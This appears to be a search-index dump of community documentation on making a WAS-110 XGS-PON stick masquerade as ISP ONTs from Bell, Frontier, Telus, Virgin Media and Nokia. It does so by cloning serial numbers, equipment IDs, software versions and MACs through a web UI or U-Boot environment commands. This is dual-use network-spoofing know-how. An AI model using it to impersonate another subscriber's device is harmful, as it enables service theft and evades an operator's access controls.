BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-bce-inc-giga-hub-on-xgs-pon-with-the-bfw-solutions-was-110/#giga-hub-software-versions","title":"Giga Hub software versions","text":"<p>The software version can be utilized as a provisioning attribute by the OLT, but this is not the case for  the Giga Hub, which uses CWMP<sup>3</sup>. However, it is recommended to keep somewhat up-to-date with the following listing, but it is not strictly necessary.</p> Firmware Version External Firmware Version 2.9 SGC8400058 1.19.6 SGC83000DC 1.19.5.4 SGC83000D0 1.19.5.1 SGC83000C8 1.16.5 SGC830007C 1.16.3 SGC830006E <p>Please help us by contributing new versions via the 8311 Discord community server or submitting a  Pull Request on GitHub.</p> <p>The following command extracts the external firmware version used by OMCI managed entity 7 and requires the  XMO client described earlier in this guide.</p> <pre><code>xmo-remote-client -p &lt;password&gt; get-value --path \"Device/DeviceInfo/SoftwareVersion\" --path \"Device/DeviceInfo/ExternalFirmwareVersion\"\n</code></pre> <ol> <li> <p>https://github.com/up-n-atom/sagemcom-modem-scripts \u21a9</p> </li> <li> <p>https://github.com/djGrrr/8311-was-110-firmware-builder \u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/TR-069 \u21a9</p> </li> </ol>"},{"location":"guides/masquerade-as-the-bce-inc-home-hub-4000-on-xgs-pon-with-the-bfw-solutions-was-110/","title":"Masquerade as the BCE Inc. Home Hub 4000 on XGS-PON with the BFW Solutions WAS-110","text":""},{"location":"guides/masquerade-as-the-bce-inc-home-hub-4000-on-xgs-pon-with-the-bfw-solutions-was-110/#determine-if-youre-an-xgs-pon-subscriber","title":"Determine if you're an XGS-PON subscriber","text":"<p>3 Gbps or higher packages</p> <p>If you're subscribed to Gigabit Fibe 3.0 or a similar 3 Gbps or higher package, skip past to Purchase a WAS-110.</p> <p>There are two (2) methods to determine if you're an XGS-PON subscriber: the simpler Web UI WAN mode  switcheroo and the more comprehensive XMO API client. </p>"},{"location":"guides/masquerade-as-the-bce-inc-home-hub-4000-on-xgs-pon-with-the-bfw-solutions-was-110/#with-the-web-ui","title":"with the web UI recommended","text":"<p>Firmware version 1.7.11 removed the helpful auto-detected mode output</p> <p></p> <ol> <li> <p>Within a web browser, navigate to    https://home/?c=advancedtools/wan    and, if asked, input your Administrator password. (1)</p> <ol> <li>The default Administrator password is located on the back label of the Home Hub 4000.</li> </ol> </li> </ol> <p></p> <ol> <li>From the WAN mode drop-down, switch from <code>AUTO</code> to <code>XGS-PON</code> and click Save.</li> </ol> <p>If your internet access doesn't drop out, you're subscribed on XGS-PON.</p>"},{"location":"guides/masquerade-as-the-bce-inc-home-hub-4000-on-xgs-pon-with-the-bfw-solutions-was-110/#with-a-xmo-client","title":"with a XMO client","text":"<p>The open-source XMO client<sup>1</sup> has a prerequisite of Python 3.10 or newer. Python installation varies by Operating System and has been outlined by the tutors at  Real Python \u2014 Python 3 Installation &amp; Setup Guide.</p> Install client <p>Open a terminal and install the open-source XMO client with:</p>  Windows macOS /  Linux <pre><code>py --version\npy -m venv venv\nvenv\\Scripts\\activate\npy -m pip install --upgrade pip \npip install https://github.com/up-n-atom/sagemcom-modem-scripts/releases/download/v0.0.4/xmo_remote_client-0.0.4-py3-none-any.whl\n</code></pre> <pre><code>python3 --version # (1)!\npython3 -m venv .venv\n. .venv/bin/activate\npython3 -m pip install --upgrade pip\npip3 install https://github.com/up-n-atom/sagemcom-modem-scripts/releases/download/v0.0.4/xmo_remote_client-0.0.4-py3-none-any.whl\n</code></pre> <ol> <li>Verify the installed Python version is &gt;= 3.10</li> </ol> Exec client <p>Finally, to determine if you're an XGS-PON subscriber, execute the following:</p> <pre><code>xmo-remote-client --password=&lt;password&gt; -a MD5 get-wan-mode\n</code></pre> <p>Note</p> <p>Replace the <code>&lt;password&gt;</code> argument; the default Administrator password is the S/N located on the back label of the  Home Hub 4000.</p>"},{"location":"guides/masquerade-as-the-bce-inc-home-hub-4000-on-xgs-pon-with-the-bfw-solutions-was-110/#purchase-a-was-110","title":"Purchase a WAS-110","text":"<p>The WAS-110 is available from select distributors and at a discounted rate with group buys on the  8311 Discord community server.</p>"},{"location":"guides/masquerade-as-the-bce-inc-home-hub-4000-on-xgs-pon-with-the-bfw-solutions-was-110/#install-community-firmware","title":"Install community firmware","text":"<p>As a prerequisite to masquerading with the WAS-110, the community firmware is necessary; follow the steps  outlined in the community firmware installation guide:</p> <p>Install 8311 community firmware on the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-bce-inc-home-hub-4000-on-xgs-pon-with-the-bfw-solutions-was-110/#was-110-masquerade-setup","title":"WAS-110 masquerade setup","text":"<p>To successfully masquerade on XGS-PON, the original ONT serial number is mandatory. It, along with other key  identifiers are available on the back label of the Home Hub 4000, color-coordinated in the following depiction:</p> <p></p>"},{"location":"guides/masquerade-as-the-bce-inc-home-hub-4000-on-xgs-pon-with-the-bfw-solutions-was-110/#from-the-web-ui","title":"from the web UI recommended","text":"<ol> <li> <p>Within a web browser, navigate to     https://192.168.11.1/cgi-bin/luci/admin/8311/config     and, if asked, input your root password.</p> As of version 2.4.0 <code>https://</code> is supported and enabled by default <p>All <code>http://</code> URLs will redirect to <code>https://</code> unless the <code>8311_https_redirect</code> environment variable is set to 0 or false.</p> </li> </ol> <p></p> <ol> <li> <p>From the 8311 Configuration page, on the PON tab, fill in the configuration with the following values:</p> <p>Reminder</p> <p>Replace the  mandatory PON Serial Number and optional  IP Host MAC address with the provisioned values on the back label of the Home Hub 4000.</p> Attribute Value Mandatory Remarks PON Serial Number (ONT ID) SMBS03831122 ONT S/N Equipment ID 5689 Hardware Version Fast5689Bell Sync Circuit Pack Version Software Version A SGC8210154 Version listing Software Version B SGC8210154 Version listing MIB File /etc/mibs/prx300_1V_bell.ini VEIP and more IP Host MAC Address 40:65:A3:FF:A7:B1  @MAC + 1 </li> <li> <p>Save changes and reboot from the System menu.</p> </li> </ol> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5  operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-bce-inc-home-hub-4000-on-xgs-pon-with-the-bfw-solutions-was-110/#from-the-shell","title":"from the shell","text":"Login over SSH <pre><code>ssh root@192.168.11.1\n</code></pre> Configure 8311 U-Boot environment <p>Highlighted lines are mandatory</p> <p>Replace the mandatory  8311_gpon_sn and optional  8311_iphost_mac with the provisioned values on the back label of the Home Hub 4000.</p> <pre><code>fwenv_set mib_file\nfwenv_set 8311_iphost_mac 40:65:A3:FF:A7:B1 # (1)!\nfwenv_set 8311_gpon_sn SMBS03831122 # (2)!\nfwenv_set 8311_equipment_id 5689\nfwenv_set 8311_hw_ver Fast5689Bell\nfwenv_set 8311_cp_hw_ver_sync 1\nfwenv_set 8311_sw_verA SGC8210154 # (3)!\nfwenv_set 8311_sw_verB SGC8210154\nfwenv_set 8311_mib_file /etc/mibs/prx300_1V_bell.ini \n</code></pre> <ol> <li> @MAC + 1, e.g. <code>40:65:A3:FF:A7:B0</code> becomes <code>40:65:A3:FF:A7:B1</code></li> <li> ONT S/N</li> <li>Version listing</li> </ol> <p>Additional details and variables are described at the original repository <sup>2</sup></p> <p><code>/usr/sbin/fwenv_set</code> is a helper script that executes <code>/usr/sbin/fw_setenv</code> twice consecutively.</p> <p>The WAS-110 functions as an A/B system, requiring the U-Boot environment variables to be set twice, once for each  environment.</p> Verify and reboot <p>Prior to rebooting, verify that the 8311 environment variables are set correctly. If not, proceed to correct them with the <code>fwenv_set</code> command as before.</p> <pre><code>fw_printenv | grep ^8311\nreboot\n</code></pre> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5  operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-bce-inc-home-hub-4000-on-xgs-pon-with-the-bfw-solutions-was-110/#home-hub-4000-software-versions","title":"Home Hub 4000 software versions","text":"<p>The software version can be utilized as a provisioning attribute by the OLT, but this is not the case for  the Home Hub 4000, which uses CWMP<sup>3</sup>. However, it is recommended to keep somewhat up-to-date with the following listing, but it is not strictly necessary.</p> Firmware Version External Firmware Version 1.7.11 SGC8210154 1.7.8.1 SGC8210140 1.7.2 SGC821011A <p>Please help us by contributing new versions via the 8311 Discord community server or submitting a Pull Request on GitHub.</p> <p>The following command extracts the external firmware version used by OMCI managed entity 7 and requires the XMO client described earlier in this guide.</p> <pre><code>xmo-remote-client -p &lt;password&gt; -a MD5 get-value --path \"Device/DeviceInfo/SoftwareVersion\" --path \"Device/DeviceInfo/ExternalFirmwareVersion\"\n</code></pre> <ol> <li> <p>https://github.com/up-n-atom/sagemcom-modem-scripts \u21a9</p> </li> <li> <p>https://github.com/djGrrr/8311-was-110-firmware-builder \u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/TR-069 \u21a9</p> </li> </ol>"},{"location":"guides/masquerade-as-the-frontier-comms-inc-fox222-frx523-with-the-bfw-solutions-was-110/","title":"Masquerade as the Frontier Communications Inc. FOX222 or FRX523 with the BFW Solutions WAS-110","text":""},{"location":"guides/masquerade-as-the-frontier-comms-inc-fox222-frx523-with-the-bfw-solutions-was-110/#purchase-a-was-110","title":"Purchase a WAS-110","text":"<p>The WAS-110 is available from select distributors and at a discounted rate with group buys on the 8311 Discord community server.</p>"},{"location":"guides/masquerade-as-the-frontier-comms-inc-fox222-frx523-with-the-bfw-solutions-was-110/#install-community-firmware","title":"Install community firmware","text":"<p>As a prerequisite to masquerading with the WAS-110, the community firmware is necessary; follow the steps outlined in the community firmware installation guide:</p> <p>Install 8311 community firmware on the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-frontier-comms-inc-fox222-frx523-with-the-bfw-solutions-was-110/#was-110-masquerade-setup","title":"WAS-110 masquerade setup","text":"<p>To successfully masquerade on XGS-PON, the original ONT serial number is mandatory. It, along with other key identifiers are available on the back label of the FOX222 or FRX523, color-coordinated in the following depiction:</p> FOX222FRX523 <p></p> <p></p>"},{"location":"guides/masquerade-as-the-frontier-comms-inc-fox222-frx523-with-the-bfw-solutions-was-110/#from-the-web-ui","title":"from the web UI recommended","text":"<ol> <li> <p>Within a web browser, navigate to    https://192.168.11.1/cgi-bin/luci/admin/8311/config    and, if asked, input your root password.</p> As of version 2.4.0 <code>https://</code> is supported and enabled by default <p>All <code>http://</code> URLs will redirect to <code>https://</code> unless the <code>8311_https_redirect</code> environment variable is set to 0 or false.</p> </li> </ol> <p></p> <ol> <li> <p>From the 8311 Configuration page, on the PON tab, fill in the configuration with the following values:</p> <p>Reminder</p> <p>Replace the  PON Serial Number with the provisioned value on the bottom label of  the FOX222 or FRX523.</p> <p>All attributes below are mandatory to achieve O5 operation state</p> FOX222FRX523 Attribute Value Remarks PON Serial Number (ONT ID) FTRO0A0A803A  S/N Equipment ID FOX222 Hardware Version FOX222 Sync Circuit Pack Version Software Version A R4.4.08.030 Version listing Software Version B R4.4.08.030 Version listing Firmware Version Match ^(R\\d+(?:.\\d+){3})$ Community FW v2.5.0+ Registration ID (HEX) 44454641554c54 <code>DEFAULT</code> in hex MIB File /etc/mibs/prx300_1U.ini PPTP i.e. default value Pon Slot 10 Attribute Value Remarks PON Serial Number (ONT ID) FTRO27900CD6   S/N Equipment ID FRX523 Hardware Version FRX523 Sync Circuit Pack Version Software Version A R4.4.13.057 Version listing Software Version B R4.4.13.057 Version listing Firmware Version Match ^(R\\d+(?:.\\d+){3})$ Community FW v2.5.0+ Registration ID (HEX) 44454641554c54 <code>DEFAULT</code> in hex MIB File /etc/mibs/prx300_1U.ini PPTP i.e. default value Pon Slot 10 </li> <li> <p>Save changes and reboot from the System menu.</p> </li> </ol> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5 operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-frontier-comms-inc-fox222-frx523-with-the-bfw-solutions-was-110/#from-the-shell","title":"from the shell","text":"Login over SSH <pre><code>ssh root@192.168.11.1\n</code></pre> Configure 8311 U-Boot environment <p>Reminder</p> <p>Replace the  8311_gpon_sn with the provisioned value on the bottom label of the  FOX222 or FRX523.</p> <p>All attributes below are mandatory to achieve O5 operation state</p> FOX222FRX523 <pre><code>fwenv_set 8311_gpon_sn FTRO0A0A803A # (1)!\nfwenv_set 8311_equipment_id FOX222\nfwenv_set 8311_hw_ver FOX222\nfwenv_set 8311_cp_hw_ver_sync 1\nfwenv_set 8311_sw_verA R4.4.08.030 # (2)!\nfwenv_set 8311_sw_verB R4.4.08.030 \nfwenv_set -b 8311_fw_match '^(R\\d+(?:\\.\\d+){3})$'\nfwenv_set 8311_pon_slot 10\nfwenv_set 8311_reg_id_hex 44454641554c54\n</code></pre> <ol> <li> S/N</li> <li>Version listing</li> </ol> <pre><code>fwenv_set 8311_gpon_sn FTRO27900CD6 # (1)!\nfwenv_set 8311_equipment_id FRX523\nfwenv_set 8311_hw_ver FRX523\nfwenv_set 8311_cp_hw_ver_sync 1\nfwenv_set 8311_sw_verA R4.4.13.057 # (2)!\nfwenv_set 8311_sw_verB R4.4.13.057\nfwenv_set -b 8311_fw_match '^(R\\d+(?:\\.\\d+){3})$'\nfwenv_set 8311_pon_slot 10\nfwenv_set 8311_reg_id_hex 44454641554c54\n</code></pre> <ol> <li> S/N</li> <li>Version listing</li> </ol> <p>Additional details and variables are described at the original repository <sup>1</sup></p> <p><code>/usr/sbin/fwenv_set</code> is a helper script that executes <code>/usr/sbin/fw_setenv</code> twice consecutively.</p> <p>The WAS-110 functions as an A/B system, requiring the U-Boot environment variables to be set twice, once for each environment.</p> Verify and reboot <p>Prior to rebooting, verify that the 8311 environment variables are set correctly. If not, proceed to correct them with the <code>fwenv_set</code> command as before.</p> <pre><code>fw_printenv | grep ^8311\nreboot\n</code></pre> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5 operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-frontier-comms-inc-fox222-frx523-with-the-bfw-solutions-was-110/#software-versions","title":"Software versions","text":"<p>Automatic software version updater built-in community firmware version(s) 2.5.0+</p> <p>Firmware upgrades sent over OMCI will be compared against the Firmware Version Match pattern and automatically update the Software Version A/B attributes if there is a match.</p> <p>Firmware images are stored in <code>/tmp/firmware.img</code> if further analysis is required.</p> <p>The software version is used as a provisioning attribute by the OLT and must be kept up-to-date with the latest version. Otherwise, upon a reboot, the WAS-110 will operate in a fake O5 state until corrected.</p> FOX222FRX523 Software Version R4.4.08.030 R4.4.08.025 Software Version R4.4.13.057 R4.4.13.051 R4.4.13.041 <p>Please help us by contributing new versions via the 8311 Discord community server or submitting a Pull Request on GitHub.</p> Serial access <p>The version can be extracted by means of the internal TTL UART header and a 3.3V USB to TTL UART adapter.</p> <p>Serial pinout</p> Pin IO 2 Rx 4 Tx <p>Serial setup</p> Value Speed 15200 Parity None Data-bits 8 Stop-bits 1 <p>Shell commands</p> <pre><code>enable\nontver\n</code></pre> <ol> <li> <p>https://github.com/djGrrr/8311-was-110-firmware-builder \u21a9</p> </li> </ol>"},{"location":"guides/masquerade-as-the-tci-nh20a-nh20t-on-xgs-pon-with-the-bfw-solutions-was-110/","title":"Masquerade as the Telus Communications Inc. NH20A or NH20T on XGS-PON with the BFW Solutions WAS-110","text":""},{"location":"guides/masquerade-as-the-tci-nh20a-nh20t-on-xgs-pon-with-the-bfw-solutions-was-110/#determine-if-youre-an-xgs-pon-subscriber","title":"Determine if you're an XGS-PON subscriber","text":""},{"location":"guides/masquerade-as-the-tci-nh20a-nh20t-on-xgs-pon-with-the-bfw-solutions-was-110/#with-the-web-ui","title":"with the web UI","text":"<ol> <li> <p>Within a web browser, navigate to https://192.168.1.254 and, if asked, input the admin password. (1)</p> <ol> <li>The default admin password is located on the front label of the NH20A/T, under the cover.</li> </ol> </li> </ol> <p></p> <ol> <li>From the index page, verify the broadband bandwidth and wavelength.</li> </ol> <p>If the bandwidth is <code>10000/10000</code> and/or wavelength is <code>1270/1577</code>, you're subscribed on XGS-PON.</p>"},{"location":"guides/masquerade-as-the-tci-nh20a-nh20t-on-xgs-pon-with-the-bfw-solutions-was-110/#purchase-a-was-110","title":"Purchase a WAS-110","text":"<p>The WAS-110 is available from select distributors and at a discounted rate with group buys on the 8311 Discord community server.</p>"},{"location":"guides/masquerade-as-the-tci-nh20a-nh20t-on-xgs-pon-with-the-bfw-solutions-was-110/#install-community-firmware","title":"Install community firmware","text":"<p>As a prerequisite to masquerading with the WAS-110, the community firmware is necessary; follow the steps outlined in the community firmware installation guide:</p> <p>Install 8311 community firmware on the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-tci-nh20a-nh20t-on-xgs-pon-with-the-bfw-solutions-was-110/#was-110-masquerade-setup","title":"WAS-110 masquerade setup","text":"<p>To successfully masquerade on XGS-PON, the original XGSPON serial number is mandatory. It, along with other key identifiers are available on the front label of the NH20A or NH20T, under the cover, color-coordinated in the following depiction:</p> <p></p>"},{"location":"guides/masquerade-as-the-tci-nh20a-nh20t-on-xgs-pon-with-the-bfw-solutions-was-110/#from-the-web-ui","title":"from the web UI recommended","text":"<ol> <li> <p>Within a web browser, navigate to    https://192.168.11.1/cgi-bin/luci/admin/8311/config    and, if asked, input your root password.</p> As of version 2.4.0 <code>https://</code> is supported and enabled by default <p>All <code>http://</code> URLs will redirect to <code>https://</code> unless the <code>8311_https_redirect</code> environment variable is set to 0 or false.</p> </li> </ol> <p></p> <ol> <li> <p>From the 8311 Configuration page, on the PON tab, fill in the configuration with the following values:</p> <p>Reminder</p> <p>Replace the  PON Serial Number with the provisioned value on the bottom label of  the NH20A or NH20T.</p> <p>All attributes below are mandatory to achieve O5 operation state</p> NH20ANH20T Attribute Value Remarks PON Serial Number (ONT ID) ARCB11228311  XGSPON S/N Equipment ID NH20A Hardware Version PRV650AB-S-TS Sync Circuit Pack Version Software Version A 3FEARCB1001505 Version listing Software Version B 3FEARCB1001505 Version listing MIB File /etc/mibs/prx300_1U_telus.ini PPTP Attribute Value Remarks PON Serial Number (ONT ID) TMBB11228311  XGSPON S/N Equipment ID NH20T Hardware Version GCNT-K Sync Circuit Pack Version Software Version A 3FEARCB1001505 Version listing Software Version B 3FEARCB1001505 Version listing MIB File /etc/mibs/prx300_1U_telus.ini PPTP </li> <li> <p>Save changes and reboot from the System menu.</p> </li> </ol> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5 operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-tci-nh20a-nh20t-on-xgs-pon-with-the-bfw-solutions-was-110/#from-the-shell","title":"from the shell","text":"Login over SSH <pre><code>ssh root@192.168.11.1\n</code></pre> Configure 8311 U-Boot environment <p>Reminder</p> <p>Replace the  8311_gpon_sn with the provisioned value on the bottom label of the  NH20A or NH20T.</p> <p>All attributes below are mandatory to achieve O5 operation state</p> NH20ANH20T <pre><code>fwenv_set mib_file\nfwenv_set 8311_gpon_sn ARCB11228311 # (1)!\nfwenv_set 8311_equipment_id NH20A\nfwenv_set 8311_hw_ver PRV650AB-S-TS\nfwenv_set 8311_cp_hw_ver_sync 1\nfwenv_set 8311_sw_verA 3FEARCB1001505 # (2)!\nfwenv_set 8311_sw_verB 3FEARCB1001505\nfwenv_set 8311_mib_file /etc/mibs/prx300_1U_telus.ini\n</code></pre> <ol> <li> XGSPON S/N</li> <li>Version listing</li> </ol> <pre><code>fwenv_set mib_file\nfwenv_set 8311_gpon_sn TMBB11228311 # (1)!\nfwenv_set 8311_equipment_id NH20T\nfwenv_set 8311_hw_ver GCNT-K\nfwenv_set 8311_cp_hw_ver_sync 1\nfwenv_set 8311_sw_verA 3FEARCB1001505 # (2)!\nfwenv_set 8311_sw_verB 3FEARCB1001505\nfwenv_set 8311_mib_file /etc/mibs/prx300_1U_telus.ini\n</code></pre> <ol> <li> XGSPON S/N</li> <li>Version listing</li> </ol> <p>Additional details and variables are described at the original repository <sup>1</sup></p> <p><code>/usr/sbin/fwenv_set</code> is a helper script that executes <code>/usr/sbin/fw_setenv</code> twice consecutively.</p> <p>The WAS-110 functions as an A/B system, requiring the U-Boot environment variables to be set twice, once for each environment.</p> Verify and reboot <p>Prior to rebooting, verify that the 8311 environment variables are set correctly. If not, proceed to correct them with the <code>fwenv_set</code> command as before.</p> <pre><code>fw_printenv | grep ^8311\nreboot\n</code></pre> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5 operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-tci-nh20a-nh20t-on-xgs-pon-with-the-bfw-solutions-was-110/#software-versions","title":"Software versions","text":"<p>The software version is used as a provisioning attribute by the OLT and must be kept up-to-date with the latest version. Otherwise, upon a reboot, the WAS-110 will operate in a fake O5 state until corrected.</p> Software Version 3FEARCB1001505 3FEARCB1001307 <p>Please help us by contributing new versions via the 8311 Discord community server or submitting a Pull Request on GitHub.</p> <ol> <li> <p>https://github.com/djGrrr/8311-was-110-firmware-builder \u21a9</p> </li> </ol>"},{"location":"guides/masquerade-as-the-virgin-media-o2-hub-5x-with-the-bfw-solutions-was-110/","title":"Masquerade as the Virgin Media O2 Hub 5x with the BFW Solutions WAS-110","text":""},{"location":"guides/masquerade-as-the-virgin-media-o2-hub-5x-with-the-bfw-solutions-was-110/#purchase-a-was-110-and-lcapc-to-scapc-adapter-or-cable","title":"Purchase a WAS-110 and LC/APC to SC/APC adapter or cable","text":"<p>The WAS-110 is available from select distributors and at a discounted rate with group buys on the 8311 Discord community server.</p> <p>A Female LC/APC to Male SC/APC adapter is necessary for connecting to the WAS-110 with the provisioned LC/APC cable, or a Male LC/APC to Male SC/APC patch cable, both of which can be purchased at https://www.amazon.co.uk/.</p> <p>APC and UPC connectors are not equal nor compatible<sup>1</sup></p>"},{"location":"guides/masquerade-as-the-virgin-media-o2-hub-5x-with-the-bfw-solutions-was-110/#install-community-firmware","title":"Install community firmware","text":"<p>As a prerequisite to masquerading with the WAS-110, the community firmware is necessary; follow the steps outlined in the community firmware installation guide:</p> <p>Install 8311 community firmware on the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-virgin-media-o2-hub-5x-with-the-bfw-solutions-was-110/#was-110-masquerade-setup","title":"WAS-110 masquerade setup","text":"<p>To successfully masquerade on XGS-PON, the original ONT serial number is mandatory. It, along with other key identifiers are available on the bottom label of the Hub 5x, color-coordinated in the following depiction:</p> <p></p>"},{"location":"guides/masquerade-as-the-virgin-media-o2-hub-5x-with-the-bfw-solutions-was-110/#from-the-web-ui","title":"from the web UI recommended","text":"<ol> <li> <p>Within a web browser, navigate to    https://192.168.11.1/cgi-bin/luci/admin/8311/config    and, if asked, input your root password.</p> As of version 2.4.0 <code>https://</code> is supported and enabled by default <p>All <code>http://</code> URLs will redirect to <code>https://</code> unless the <code>8311_https_redirect</code> environment variable is set to 0 or false.</p> </li> </ol> <p></p> <ol> <li> <p>From the 8311 Configuration page, on the PON tab, fill in the configuration with the following values:</p> <p>Reminder</p> <p>Replace the mandatory  PON Serial Number and optional  IP Host MAC address with the provisioned values on the bottom label of the Hub 5x.</p> Attribute Value Mandatory Remarks PON Serial Number (ONT ID) SMBS13E78311  PON S/N Equipment ID F5685LGB Hardware Version 1.2.1b Sync Circuit Pack Version Software Version A 3.7.4-2306.5 Version listing Software Version B 3.7.4-2306.5 Version listing MIB File /etc/mibs/prx300_1V_bell.ini VEIP and more IP Host MAC Address C4:EB:43:00:00:01 MAC </li> <li> <p>Save changes and reboot from the System menu.</p> </li> </ol> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5 operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-virgin-media-o2-hub-5x-with-the-bfw-solutions-was-110/#from-the-shell","title":"from the shell","text":"Login over SSH <pre><code>ssh root@192.168.11.1\n</code></pre> Configure 8311 U-Boot environment <p>Highlighted lines are mandatory</p> <p>Replace the mandatory  8311_gpon_sn and optional  8311_iphost_mac with the provisioned values on the bottom label of the Hub 5x.</p> <pre><code>fwenv_set mib_file\nfwenv_set 8311_iphost_mac C4:EB:43:00:00:01 # (1)!\nfwenv_set 8311_gpon_sn SMBS13E78311 # (2)!\nfwenv_set 8311_equipment_id F5685LGB\nfwenv_set 8311_hw_ver 1.2.1b\nfwenv_set 8311_cp_hw_ver_sync 1\nfwenv_set 8311_sw_verA 3.7.4-2306.5 # (3)!\nfwenv_set 8311_sw_verB 3.7.4-2306.5\nfwenv_set 8311_mib_file /etc/mibs/prx300_1V_bell.ini\n</code></pre> <ol> <li> MAC</li> <li> PON S/N</li> <li>Version listing</li> </ol> <p>Additional details and variables are described at the original repository <sup>2</sup></p> <p><code>/usr/sbin/fwenv_set</code> is a helper script that executes <code>/usr/sbin/fw_setenv</code> twice consecutively.</p> <p>The WAS-110 functions as an A/B system, requiring the U-Boot environment variables to be set twice, once for each environment.</p> Verify and reboot <p>Prior to rebooting, verify that the 8311 environment variables are set correctly. If not, proceed to correct them with the <code>fwenv_set</code> command as before.</p> <pre><code>fw_printenv | grep ^8311\nreboot\n</code></pre> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5 operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-virgin-media-o2-hub-5x-with-the-bfw-solutions-was-110/#hub-5x-software-versions","title":"Hub 5x software versions","text":"<p>The software version can be utilized as a provisioning attribute by the OLT, but this is not the case for the Hub 5x, which uses CWMP<sup>3</sup>. However, it is recommended to keep somewhat up-to-date with the following listing, but it is not strictly necessary.</p> Software Version 3.7.4-2306.5 <p>Please help us by contributing new versions via the 8311 Discord community server or submitting a Pull Request on GitHub.</p> <ol> <li> <p>https://www.servethehome.com/apc-and-upc-in-fiber-connectors-and-why-this-matters/ \u21a9</p> </li> <li> <p>https://github.com/djGrrr/8311-was-110-firmware-builder \u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/TR-069 \u21a9</p> </li> </ol>"},{"location":"guides/swap-out-the-nokia-xs-010x-q-for-a-small-form-factor-pluggable-bfw-solutions-was-110/","title":"Swap out the Nokia XS-010X-Q for a Small Form-factor Pluggable BFW Solutions WAS-110","text":"<p>This is strictly for the form-factor as they're both SFU ONTs</p> <p></p>"},{"location":"guides/swap-out-the-nokia-xs-010x-q-for-a-small-form-factor-pluggable-bfw-solutions-was-110/#purchase-a-was-110","title":"Purchase a WAS-110","text":"<p>The WAS-110 is available from select distributors and at a discounted rate with group buys on the 8311 Discord community server.</p>"},{"location":"guides/swap-out-the-nokia-xs-010x-q-for-a-small-form-factor-pluggable-bfw-solutions-was-110/#install-community-firmware","title":"Install community firmware","text":"<p>As a prerequisite to masquerading with the WAS-110, the community firmware is necessary; follow the steps outlined in the community firmware installation guide:</p> <p>Install 8311 community firmware on the BFW Solutions WAS-110</p>"},{"location":"guides/swap-out-the-nokia-xs-010x-q-for-a-small-form-factor-pluggable-bfw-solutions-was-110/#extract-attributes-from-the-xs-010x-q","title":"Extract attributes from the XS-010X-Q","text":"<ol> <li> <p>Within a web browser, navigate to https://192.168.100.1 and, if asked, input the admin password <code>1234</code>.</p> </li> <li> <p>From the ONT install page, click on More info button.</p> </li> </ol> <p></p> <ol> <li>Copy all the attributes for entry later in the guide.</li> </ol>"},{"location":"guides/swap-out-the-nokia-xs-010x-q-for-a-small-form-factor-pluggable-bfw-solutions-was-110/#was-110-masquerade-setup","title":"WAS-110 masquerade setup","text":"<p>Additionally, mandatory identifiers are available on the back label of the XS-010X-Q, such as ONT P/N, ICS, and CLEI.</p> <p></p>"},{"location":"guides/swap-out-the-nokia-xs-010x-q-for-a-small-form-factor-pluggable-bfw-solutions-was-110/#from-the-web-ui","title":"from the web UI recommended","text":"<ol> <li> <p>Within a web browser, navigate to    https://192.168.11.1/cgi-bin/luci/admin/8311/config    and, if asked, input your root password.</p> As of version 2.4.0 <code>https://</code> is supported and enabled by default <p>All <code>http://</code> URLs will redirect to <code>https://</code> unless the <code>8311_https_redirect</code> environment variable is set to 0 or false.</p> </li> </ol> <p></p> <ol> <li> <p>From the 8311 Configuration page, on the PON tab, fill in the configuration with the following values:</p> <p>All attributes below are mandatory to achieve O5 operation state</p> <p>Replace the PON Serial Number, IP Host MAC address, Registration ID, and Software Version A/B with the provisioned values.</p> Attribute Value Remarks PON Serial Number (ONT ID) ALCLFC1D37D3 Serial number Equipment ID BVMGY10BRAXS010XQ CLEI + Mnemonic Hardware Version 3FE49331AAAB01 ONT P/N. + ICS Sync Circuit Pack Version Software Version A 3FE49337AOCK10 Active software version Software Version B 3FE49337AOCK80 Standby software version Firmware Version Match ^(3FE4933\\d[A-Z]OCK\\d{2})$ Registration ID Input if ONT ID is not null (all 00's) MIB File /etc/mibs/prx300_1U.ini PPTP i.e. default value PON Slot 10 IP Host MAC Address FC:B2:D6:18:47:40 MAC ID </li> <li> <p>Save changes and reboot from the System menu.</p> </li> </ol> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5 operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions 